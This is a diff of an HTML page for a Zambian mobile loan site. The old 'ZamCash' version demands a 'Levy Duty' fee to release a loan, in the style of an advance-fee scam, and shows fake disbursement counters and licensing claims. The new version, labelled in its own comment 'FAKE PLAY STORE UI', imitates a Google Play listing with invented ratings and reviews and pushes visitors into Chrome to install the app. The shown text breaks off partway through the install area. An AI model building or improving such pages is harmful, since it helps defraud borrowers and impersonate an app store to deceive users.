@@ -1,2435 +1,883 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>ZamCash &mdash; The quickest loan in Zambia</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <style>
-    .spinner{border:3px solid #fff3;border-top-color:#fff;border-radius:50%;width:18px;height:18px;animation:spin .8s linear infinite;display:inline-block}
-    @keyframes spin{to{transform:rotate(360deg)}}
-    .elig-spinner{border:4px solid rgba(255,255,255,0.28);border-top-color:#fff;border-radius:50%;width:36px;height:36px;animation:spin .9s linear infinite;display:inline-block}
-    @keyframes pulse-ring{0%{transform:scale(0.8);opacity:0.8}100%{transform:scale(1.4);opacity:0}}
-    .pulse-ring::before{content:'';position:absolute;inset:0;border-radius:9999px;background:#10b981;animation:pulse-ring 1.8s cubic-bezier(0.4,0,0.6,1) infinite;z-index:0}
-    @keyframes pulse-ring-light{0%{transform:scale(0.8);opacity:0.9}100%{transform:scale(1.6);opacity:0}}
-    .pulse-ring-light::before{content:'';position:absolute;inset:0;border-radius:9999px;background:rgba(255,255,255,0.7);animation:pulse-ring-light 2s cubic-bezier(0.4,0,0.6,1) infinite;z-index:0}
-    @keyframes pulse-ring-blue{0%{transform:scale(0.8);opacity:0.6}100%{transform:scale(1.4);opacity:0}}
-    .pulse-ring-blue::before{content:'';position:absolute;inset:0;border-radius:9999px;background:rgba(37,99,235,0.35);animation:pulse-ring-blue 2s cubic-bezier(0.4,0,0.6,1) infinite;z-index:0}
-    @keyframes btn-shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
-    .btn-processing{background-image:linear-gradient(90deg,#15803d 0%,#22c55e 50%,#15803d 100%)!important;background-size:200% 100%!important;animation:btn-shimmer 2s linear infinite;cursor:not-allowed}
-    #payProgress{transition:width 0.55s cubic-bezier(0.4,0,0.2,1);width:0%}
-    #payBtn .pay-label{transition:opacity 0.25s ease}
-    @keyframes btn-pulse{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.5)}50%{box-shadow:0 0 0 8px rgba(34,197,94,0)}}
-    .btn-processing{animation:btn-shimmer 2s linear infinite,btn-pulse 2s ease-in-out infinite}
-    @keyframes sheet-up{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
-    @keyframes fade-in{from{opacity:0}to{opacity:1}}
-    @keyframes pop-in{0%{transform:scale(0.85);opacity:0}60%{transform:scale(1.02);opacity:1}100%{transform:scale(1);opacity:1}}
-    .sheet-anim{animation:sheet-up 0.32s cubic-bezier(0.32,0.72,0,1)}
-    .fade-anim{animation:fade-in 0.22s ease-out}
-    .pop-anim{animation:pop-in 0.32s cubic-bezier(0.34,1.56,0.64,1)}
-    @keyframes toast-in{from{transform:translate(-50%,20px);opacity:0}to{transform:translate(-50%,0);opacity:1}}
-    .toast-anim{animation:toast-in 0.3s cubic-bezier(0.34,1.56,0.64,1)}
-    @keyframes pay-btn-pulse{0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.65),0 12px 28px -6px rgba(22,163,74,0.55)}50%{box-shadow:0 0 0 14px rgba(34,197,94,0),0 12px 28px -6px rgba(22,163,74,0.55)}}
-    @keyframes pay-btn-shimmer{0%{transform:translateX(-150%) skewX(-20deg)}60%{transform:translateX(250%) skewX(-20deg)}100%{transform:translateX(250%) skewX(-20deg)}}
-    @keyframes pay-btn-bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-3px)}}
-    @keyframes pay-btn-flash{0%,100%{filter:brightness(1)}50%{filter:brightness(1.12)}}
-    @keyframes pay-btn-arrow{0%,100%{transform:translateX(0)}50%{transform:translateX(4px)}}
-    .pay-btn-attention{position:relative;overflow:hidden;background:linear-gradient(135deg,#22c55e 0%,#16a34a 55%,#15803d 100%);animation:pay-btn-pulse 2.2s ease-in-out infinite,pay-btn-bounce 3s ease-in-out infinite,pay-btn-flash 3.5s ease-in-out infinite}
-    .pay-btn-attention::before{content:'';position:absolute;top:-10%;left:0;width:40%;height:120%;background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,0.55) 50%,transparent 100%);animation:pay-btn-shimmer 2.8s ease-in-out infinite;pointer-events:none}
-    .pay-btn-attention .arrow-anim{animation:pay-btn-arrow 1.6s ease-in-out infinite;display:inline-block}
-    .pay-btn-attention:active{transform:scale(0.98)}
-    .wizard-step{display:none}
-    .wizard-step.active{display:block}
-    .wizard-dot{transition:all 0.3s ease}
-    .wizard-dot.active{background:#047857;color:#fff}
-    .wizard-dot.done{background:#d1fae5;color:#047857}
-    .wizard-line{transition:background 0.3s ease}
-    .wizard-line.done{background:#047857}
-    .amount-box{padding:0.75rem;border-radius:0.75rem;border:1px solid #e5e7eb;background:#fff;text-align:center;transition:all 0.15s ease}
-    .amount-box:hover{border-color:#6ee7b7;background:#f0fdf4}
-    .amount-box:active{transform:scale(0.98)}
-    .amount-box.selected{border:2px solid #047857;background:#d1fae5}
-    .amount-box:disabled{opacity:0.45;cursor:not-allowed}
-    .amount-box-sm{padding:0.5rem 0.3rem;border-radius:0.5rem;border:1px solid #e5e7eb;background:#fff;transition:all 0.15s ease;text-align:center}
-    .amount-box-sm:hover{border-color:#6ee7b7;background:#f0fdf4}
-    .amount-box-sm:active{transform:scale(0.97)}
-    .amount-box-sm.selected{border:2px solid #047857;background:#d1fae5}
-    .amount-box-sm:disabled{opacity:0.45;cursor:not-allowed}
-    #eligProgress{transition:width 0.18s linear}
-    .back-btn{display:inline-flex;align-items:center;justify-content:center;width:36px;height:36px;border-radius:9999px;background:#f3f4f6;color:#4b5563;font-size:18px;line-height:1;transition:background 0.15s ease}
-    .back-btn:hover{background:#e5e7eb}
-    .back-btn:active{transform:scale(0.94)}
-    @keyframes float-up{0%{transform:translateY(10px);opacity:0}100%{transform:translateY(0);opacity:1}}
-    .float-up-anim{animation:float-up 0.5s cubic-bezier(0.34,1.56,0.64,1)}
-    @keyframes success-bounce{0%{transform:scale(0.5);opacity:0}60%{transform:scale(1.08);opacity:1}100%{transform:scale(1);opacity:1}}
-    .success-bounce{animation:success-bounce 0.6s cubic-bezier(0.34,1.56,0.64,1)}
-    @keyframes shine{0%{background-position:-100% 0}100%{background-position:200% 0}}
-    .shine-text{background:linear-gradient(90deg,#fbbf24 0%,#fef3c7 50%,#fbbf24 100%);background-size:200% auto;-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;animation:shine 3s linear infinite}
-    @keyframes phone-wiggle{0%,100%{transform:rotate(0)}25%{transform:rotate(-6deg)}75%{transform:rotate(6deg)}}
-    .phone-wiggle{animation:phone-wiggle 1.6s ease-in-out infinite;display:inline-block}
-    @keyframes dot-fade{0%,80%,100%{opacity:0.3;transform:scale(0.8)}40%{opacity:1;transform:scale(1.1)}}
-    .dot-fade{animation:dot-fade 1.4s ease-in-out infinite}
-    @keyframes pulse-slow{0%,100%{box-shadow:0 0 0 0 rgba(220,38,38,0.6),0 10px 25px -5px rgba(220,38,38,0.4)}50%{box-shadow:0 0 0 12px rgba(220,38,38,0),0 10px 25px -5px rgba(220,38,38,0.4)}}
-    .animate-pulse-slow{animation:pulse-slow 2.2s ease-in-out infinite}
-    @keyframes ticker-slide-in{0%{transform:translateY(100%);opacity:0}100%{transform:translateY(0);opacity:1}}
-    @keyframes ticker-slide-out{0%{transform:translateY(0);opacity:1}100%{transform:translateY(-100%);opacity:0}}
-    .ticker-slide-in{animation:ticker-slide-in 0.5s cubic-bezier(0.34,1.56,0.64,1)}
-    .ticker-slide-out{animation:ticker-slide-out 0.4s ease-in}
-    @keyframes dot-live{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.4)}}
-    .dot-live{animation:dot-live 1.4s ease-in-out infinite}
-    @keyframes counter-bump{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}
-    .counter-bump{animation:counter-bump 0.5s ease-out}
-    @keyframes slide-down{from{max-height:0;opacity:0}to{max-height:400px;opacity:1}}
-    .slide-down{animation:slide-down 0.3s cubic-bezier(0.34,1.56,0.64,1);overflow:hidden}
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ZambiaCash - Apps on Google Play</title>
+    <meta name="theme-color" content="#1E40AF">
+    <link rel="manifest" href="manifest.json">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+                        roboto: ['"Roboto"', 'sans-serif']
+                    },
+                    colors: {
+                        brandBlue: '#1E40AF',
+                        brandYellow: '#F59E0B',
+                        playBlue: '#0056D2',
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .hide { display: none !important; }
+        .screen { display: none; flex-direction: column; min-height: 100vh; }
+        .screen.active { display: flex; }
+        .gradient-bg { background: linear-gradient(135deg, #1E40AF 0%, #3B82F6 100%); }
+        .card { background: white; border-radius: 1.5rem; padding: 1.5rem; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 0.75rem; border: 1.5px solid #E2E8F0; border-radius: 0.75rem; outline: none; font-size: 0.95rem; }
+        input:focus { border-color: #1E40AF; }
+        .amount-btn.selected { background-color: #1E40AF; color: white; border-color: #1E40AF; }
+        .term-btn.selected { background-color: #1E40AF; color: white; border-color: #1E40AF; }
+        .hide-scrollbar::-webkit-scrollbar { display: none; }
+        @keyframes slideDown { from { transform: translateY(-100%); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        .toast { animation: slideDown 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+        .star { color: #FBBF24; }
+        .review-avatar {
+            width: 32px; height: 32px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            color: white; font-weight: bold; font-size: 14px;
+        }
+        @keyframes arrowBounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-12px); }
+        }
+        .arrow-bounce { animation: arrowBounce 1.6s ease-in-out infinite; }
+        @keyframes iconPop {
+            0% { transform: scale(0.8); opacity: 0; }
+            60% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .icon-pop { animation: iconPop 0.6s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+    </style>
 </head>
-<body class="bg-gray-50 text-gray-900 min-h-screen">
+<body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
-  <!-- LANDING -->
-  <div id="landingView" class="hidden min-h-screen w-full">
-    <header class="bg-white border-b border-gray-100 sticky top-0 z-40">
-      <div class="max-w-md mx-auto px-5 py-3 flex items-center gap-2">
-        <div class="inline-flex items-center justify-center w-8 h-8 rounded-lg bg-emerald-700">
-          <svg class="w-4 h-4 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.2">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M11.48 3.499a.562.562 0 011.04 0l2.125 5.111a.563.563 0 00.475.345l5.518.442c.499.04.701.663.321.988l-4.204 3.602a.563.563 0 00-.182.557l1.285 5.385a.562.562 0 01-.84.61l-4.725-2.885a.563.563 0 00-.586 0L6.982 20.54a.562.562 0 01-.84-.61l1.285-5.386a.562.562 0 00-.182-.557l-4.204-3.602c-.38-.325-.178-.948.321-.988l5.518-.442a.563.563 0 00.475-.345L11.48 3.5z" />
-          </svg>
+    <!-- 0. OFFLINE GATE (Shows if no internet) -->
+    <div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
+        <div class="w-24 h-24 bg-red-500/20 rounded-full flex items-center justify-center mb-6 animate-pulse">
+            <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path></svg>
         </div>
-        <span class="font-bold text-base tracking-tight">ZamCash</span>
-        <span class="ml-auto text-[10px] font-bold text-emerald-700 bg-emerald-50 border border-emerald-100 px-2 py-1 rounded-full">&#127487;&#127474; Zambia</span>
-      </div>
-    </header>
-
-    <section class="bg-gradient-to-b from-emerald-700 to-emerald-800 px-5 pt-8 pb-6">
-      <div class="max-w-md mx-auto">
-        <div class="inline-flex items-center gap-1.5 bg-yellow-300/95 text-yellow-900 text-[10px] font-bold uppercase tracking-wide px-2.5 py-1 rounded-full mb-3">
-          <span class="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse"></span>
-          The quickest loan in Zambia
-        </div>
-        <h1 class="text-white text-[26px] leading-[1.15] font-extrabold tracking-tight">
-          Cash in your phone in <span class="text-yellow-300">5 minutes</span>.
-        </h1>
-        <p class="text-emerald-100/85 text-sm mt-2 leading-relaxed">
-          No collateral. No paperwork. Just your phone. Borrow from <strong class="text-white">ZMW 100</strong> up to <strong class="text-white">ZMW 6,000</strong> today.
+        <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
+        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">
+            ZambiaCash requires an active internet connection to work. Please turn on mobile data or Wi-Fi.
         </p>
+        <button onclick="retryConnection()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl shadow-lg active:scale-95 transition-transform flex items-center justify-center gap-2">
+            <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path></svg>
+            Retry Connection
+        </button>
+    </div>
 
-        <div class="mt-4 bg-white/10 backdrop-blur-sm border border-white/20 rounded-xl px-3 py-2.5">
-          <div class="flex items-start gap-2">
-            <svg class="w-4 h-4 text-yellow-300 flex-shrink-0 mt-0.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2.5">
-              <path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-            </svg>
-            <p class="text-[11px] text-emerald-50 leading-snug">
-              A one-time <strong class="text-white">KSh 100 Levy Duty</strong> is charged to release your loan funds. No other fees.
-            </p>
-          </div>
+    <!-- 1. IN-APP BROWSER WARNING -->
+    <div id="browser-warning" class="hide fixed inset-0 z-[10000] bg-gray-900 flex flex-col items-center justify-center p-6 text-center">
+        <div class="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mb-4">
+            <svg class="w-10 h-10 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
         </div>
-
-        <div class="mt-3 flex items-center gap-2 bg-white/10 backdrop-blur-sm border border-white/20 rounded-xl px-3 py-2">
-          <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 dot-live"></span>
-          <p class="text-[11px] text-emerald-50">
-            <strong id="landingTodayCount">347</strong> loans disbursed today
-          </p>
-        </div>
-
-        <div class="grid grid-cols-2 gap-2 mt-4">
-          <button onclick="openApplyWizard()" class="bg-white text-emerald-800 py-3.5 rounded-xl font-bold text-sm shadow-lg active:scale-[0.98] transition-transform">
-            Apply Now
-          </button>
-          <button onclick="openStatusCheck()" class="bg-white/10 backdrop-blur-sm border border-white/30 text-white py-3.5 rounded-xl font-bold text-sm active:scale-[0.98] transition-transform">
-            Check Status
-          </button>
-        </div>
-      </div>
-    </section>
-
-    <section class="max-w-md mx-auto px-5 mt-8">
-      <div class="flex items-center justify-between mb-3">
-        <h2 class="text-sm font-bold text-gray-800">Pick an amount</h2>
-        <span class="text-[10px] text-gray-400">Tap to start</span>
-      </div>
-      <p class="text-[11px] text-gray-500 mb-3 leading-snug">
-        Select the loan amount you want. The <strong class="text-gray-700">Levy Duty (KSh 100)</strong> is the same for every amount.
-      </p>
-      <div id="landingAmountBoxes" class="grid grid-cols-2 gap-2"></div>
-    </section>
-
-    <section class="max-w-md mx-auto px-5 mt-6">
-      <p class="text-center text-xs text-gray-500">
-        Already have an account?
-        <button onclick="openLoginFromLanding()" class="text-emerald-700 font-bold">Sign in &rarr;</button>
-      </p>
-    </section>
-
-    <footer class="max-w-md mx-auto px-5 pb-8 pt-10 text-center">
-      <div class="flex items-center justify-center gap-4 mb-3">
-        <span class="text-[10px] text-gray-500 font-medium">Licensed</span>
-        <div class="w-px h-3 bg-gray-200"></div>
-        <span class="text-[10px] text-gray-500 font-medium">256-bit SSL</span>
-        <div class="w-px h-3 bg-gray-200"></div>
-        <span class="text-[10px] text-gray-500 font-medium">Mobile Money</span>
-      </div>
-      <p class="text-[10px] text-gray-400">&copy; 2026 ZamCash. All rights reserved.</p>
-    </footer>
-  </div>
-
-  <!-- LOGIN -->
-  <div id="loginView" class="hidden min-h-screen w-full bg-gray-50">
-    <header class="bg-white border-b border-gray-100 sticky top-0 z-40">
-      <div class="max-w-md mx-auto px-5 py-3 flex items-center gap-3">
-        <button onclick="closeLogin()" class="text-gray-600 text-lg leading-none">&larr;</button>
-        <span class="font-bold text-base">Sign In</span>
-      </div>
-    </header>
-
-    <div class="max-w-md mx-auto px-5 pt-6">
-      <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
-        <div class="w-14 h-14 rounded-full bg-emerald-100 flex items-center justify-center mx-auto mb-4">
-          <svg class="w-6 h-6 text-emerald-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" />
-          </svg>
-        </div>
-        <h2 class="text-lg font-bold text-center text-gray-900">Welcome back</h2>
-        <p class="text-xs text-gray-500 text-center mt-1 leading-relaxed" id="loginSubtitle">
-          Enter your password to continue.
+        <h2 class="text-2xl font-bold text-white mb-2 font-sans">Action Required</h2>
+        <p class="text-gray-400 mb-8 text-sm leading-relaxed max-w-xs mx-auto font-sans">
+            To install ZambiaCash, you must open this page in Google Chrome.
         </p>
-
-        <div class="mt-5 space-y-3.5">
-          <div>
-            <label class="block text-xs font-medium text-gray-600 mb-1.5">Phone Number</label>
-            <input type="tel" id="loginPhone" required inputmode="numeric" placeholder="07XX XXX XXX" class="w-full border border-gray-200 bg-gray-50 rounded-xl px-3 py-3 text-sm font-mono outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-colors" />
-          </div>
-          <div>
-            <label class="block text-xs font-medium text-gray-600 mb-1.5">Password</label>
-            <input type="password" id="loginPassword" required class="w-full border border-gray-200 bg-gray-50 rounded-xl px-3 py-3 text-sm outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-colors" />
-          </div>
-        </div>
-
-        <div id="loginError" class="hidden mt-3 bg-red-50 border border-red-100 text-red-800 text-sm rounded-lg p-3"></div>
-
-        <button id="loginBtn" onclick="attemptLogin()" class="mt-5 w-full bg-emerald-700 text-white py-3 rounded-xl hover:bg-emerald-800 font-semibold text-sm flex items-center justify-center gap-2">
-          <span id="loginBtnText">Sign In</span>
-        </button>
-
-        <p class="text-center text-xs text-gray-500 mt-4">
-          Not registered yet?
-          <button onclick="closeLogin(); openApplyWizard();" class="text-emerald-700 font-semibold">Apply for a loan &rarr;</button>
-        </p>
-      </div>
-    </div>
-  </div>
-
-  <!-- STATUS CHECK -->
-  <div id="statusView" class="hidden min-h-screen w-full bg-gray-50">
-    <header class="bg-white border-b border-gray-100 sticky top-0 z-40">
-      <div class="max-w-md mx-auto px-5 py-3 flex items-center gap-3">
-        <button onclick="showView('landingView')" class="text-gray-600 text-lg leading-none">&larr;</button>
-        <span class="font-bold text-base">Check Application Status</span>
-      </div>
-    </header>
-
-    <div class="max-w-md mx-auto px-5 pt-6">
-      <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
-        <div class="w-14 h-14 rounded-full bg-emerald-100 flex items-center justify-center mx-auto mb-4">
-          <svg class="w-6 h-6 text-emerald-700" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-            <path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z" />
-          </svg>
-        </div>
-        <h2 class="text-lg font-bold text-center text-gray-900">Find your application</h2>
-        <p class="text-xs text-gray-500 text-center mt-1 leading-relaxed">
-          Enter the phone number you used to apply.
-        </p>
-
-        <div class="mt-5">
-          <label class="block text-xs font-medium text-gray-600 mb-1.5">Phone Number</label>
-          <input type="tel" id="statusPhone" required inputmode="numeric" placeholder="07XX XXX XXX" class="w-full border border-gray-200 bg-gray-50 rounded-xl px-3 py-3 text-sm font-mono outline-none focus:bg-white focus:border-emerald-500 focus:ring-4 focus:ring-emerald-500/10 transition-colors" />
-          <p class="text-[10px] text-gray-400 mt-1">Format: 0712345678 or 254712345678</p>
-        </div>
-
-        <button id="statusCheckBtn" onclick="checkApplicationStatus()" class="mt-4 w-full bg-emerald-700 text-white py-3 rounded-xl hover:bg-emerald-800 font-semibold text-sm flex items-center justify-center gap-2">
-          <span id="statusCheckText">Check Status</span>
-        </button>
-      </div>
-
-      <div id="statusResult" class="hidden mt-4"></div>
-
-      <div class="mt-6 text-center">
-        <p class="text-xs text-gray-500">Not applied yet?</p>
-        <button onclick="openApplyWizard()" class="mt-2 text-emerald-700 font-bold text-sm">Apply for a loan &rarr;</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- APPLY WIZARD -->
-  <div id="applyWizardView" class="hidden min-h-screen w-full bg-gray-50">
-    <header class="bg-white border-b border-gray-100 sticky top-0 z-40">
-      <div class="max-w-md mx-auto px-5 py-3 flex items-center gap-3">
-        <button onclick="closeApplyWizard()" class="text-gray-600 text-lg leading-none">&larr;</button>
-        <span class="font-bold text-base">Apply for a Loan</span>
-      </div>
-    </header>
-
-    <div class="max-w-md mx-auto px-5 pt-5">
-      <div class="flex items-center gap-1.5">
-        <div class="wizard-dot active w-7 h-7 rounded-full flex items-center justify-center text-[11px] font-bold" data-step="1">1</div>
-        <div class="wizard-line flex-1 h-0.5 bg-gray-200" data-line="1"></div>
-        <div class="wizard-dot w-7 h-7 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center text-[11px] font-bold" data-step="2">2</div>
-        <div class="wizard-line flex-1 h-0.5 bg-gray-200" data-line="2"></div>
-        <div class="wizard-dot w-7 h-7 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center text-[11px] font-bold" data-step="3">3</div>
-      </div>
-      <p class="text-[11px] text-gray-500 mt-2" id="wizardStepLabel">Step 1 of 3 &mdash; Choose amount</p>
-      <p id="wizardError" class="hidden mt-3 text-red-600 text-xs font-medium"></p>
+        <button onclick="openInChrome()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl mb-3 font-sans">Open in Chrome</button>
+        <button onclick="copyLink()" class="w-full max-w-xs bg-gray-800 text-white font-bold py-3.5 rounded-xl border border-gray-700 font-sans">Copy Link</button>
     </div>
 
-    <div class="wizard-step active max-w-md mx-auto px-5 pt-4" data-step="1">
-      <div class="bg-white rounded-2xl shadow-sm border border-gray-100 p-5">
-        <h2 class="text-base font-bold text-gray-900 mb-1">Choose your loan amount</h2>
-        <p class="text-[11px] text-gray-500 mb-3">Tap a box to select your amount.</p>
-
-        <div class="mb-4 bg-amber-50 border border-amber-200 rounded-xl p-3">
-          <div class="flex items-start gap-2">
-            <div class="w-6 h-6 rounded-full bg-amber-400 flex items-center justify-center flex-shrink-0">
-              <svg class="w-3.5 h-3.5 text-amber-900" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
-              </svg>
+    <!-- 2. FAKE PLAY STORE UI -->
+    <div id="play-store-gate" class="hide fixed inset-0 z-[9999] bg-white overflow-y-auto pb-20">
+        
+        <div class="flex items-center justify-between p-4 sticky top-0 bg-white z-10 border-b border-gray-100">
+            <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M10 19l-7-7m0 0l7-7m-7 7h18"></path></svg>
+            <div class="flex items-center gap-4">
+                <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg>
+                <svg class="w-6 h-6 text-gray-700" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z"></path></svg>
             </div>
-            <div>
-              <p class="text-[11px] font-extrabold text-amber-900 uppercase tracking-wide leading-none">Before you apply</p>
-              <p class="text-[11px] text-amber-900 mt-1 leading-snug">
-                Every loan has a <strong>one-time Levy Duty of KSh 100</strong>. This fee is paid to release your funds after your loan is sanctioned.
-              </p>
-            </div>
-          </div>
         </div>
 
-        <div id="wizardAmountBoxes" class="grid grid-cols-2 gap-2 mb-4"></div>
-        <div id="wizardSelectedDisplay" class="hidden bg-emerald-50 border border-emerald-200 rounded-xl p-3 mb-4">
-          <div class="flex justify-between text-sm">
-            <span class="text-gray-600">Selected loan amount</span>
-            <div class="text-right">
-              <p class="font-bold text-emerald-800" id="wizardSelectedAmount">&mdash;</p>
-              <p class="text-[10px] text-emerald-600" id="wizardSelectedAmountKsh">&mdash;</p>
+        <div class="p-5 max-w-lg mx-auto">
+            <div class="flex gap-4 mb-6">
+                <img src="icon.png" class="w-20 h-20 rounded-2xl shadow-sm border border-gray-100" alt="ZambiaCash Icon">
+                <div>
+                    <h1 class="text-2xl font-bold text-gray-900 leading-tight">ZambiaCash</h1>
+                    <p class="text-playBlue font-medium text-sm mt-1">ZambiaCash Financial</p>
+                    <p class="text-gray-500 text-xs mt-1">Contains ads</p>
+                </div>
             </div>
-          </div>
-          <div class="border-t border-emerald-200 pt-2 mt-2 flex justify-between text-sm">
-            <div>
-              <p class="text-gray-700 font-semibold">Levy Duty</p>
-              <p class="text-[10px] text-gray-500 mt-0.5">One-time fee to release your loan</p>
+
+            <div class="flex justify-between items-center text-center py-4 mb-6">
+                <div class="flex-1 flex flex-col items-center">
+                    <div class="flex items-center gap-1">
+                        <span class="font-bold text-lg">4.5</span>
+                        <svg class="w-4 h-4 text-gray-800" fill="currentColor" viewBox="0 0 20 20"><path d="M9.049 2.927c.3-.921 1.603-.921 1.902 0l1.07 3.292a1 1 0 00.95.69h3.462c.969 0 1.371 1.24.588 1.81l-2.8 2.034a1 1 0 00-.364 1.118l1.07 3.292c.3.921-.755 1.688-1.54 1.118l-2.8-2.034a1 1 0 00-1.175 0l-2.8 2.034c-.784.57-1.838-.197-1.539-1.118l1.07-3.292a1 1 0 00-.364-1.118L2.98 8.72c-.783-.57-.38-1.81.588-1.81h3.461a1 1 0 00.951-.69l1.07-3.292z"></path></svg>
+                    </div>
+                    <span class="text-xs text-gray-600">12K reviews ⓘ</span>
+                </div>
+                <div class="w-px h-10 bg-gray-200"></div>
+                <div class="flex-1 flex flex-col items-center">
+                    <svg class="w-5 h-5 mb-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
+                    <span class="font-bold text-sm" id="top-size-text">10 MB</span>
+                </div>
+                <div class="w-px h-10 bg-gray-200"></div>
+                <div class="flex-1 flex flex-col items-center">
+                    <div class="border border-gray-600 rounded px-1.5 text-xs font-bold mb-1">12+</div>
+                    <span class="text-xs text-gray-600">Rated for 12+ ⓘ</span>
+                </div>
             </div>
-            <div class="text-right">
-              <p class="font-bold text-emerald-800" id="wizardSelectedFee">&mdash;</p>
-              <p class="text-[10px] text-emerald-600" id="wizardSelectedFeeKsh">&mdash;</p>
+
+            <div class="flex gap-2 mb-8" id="install-action-area">
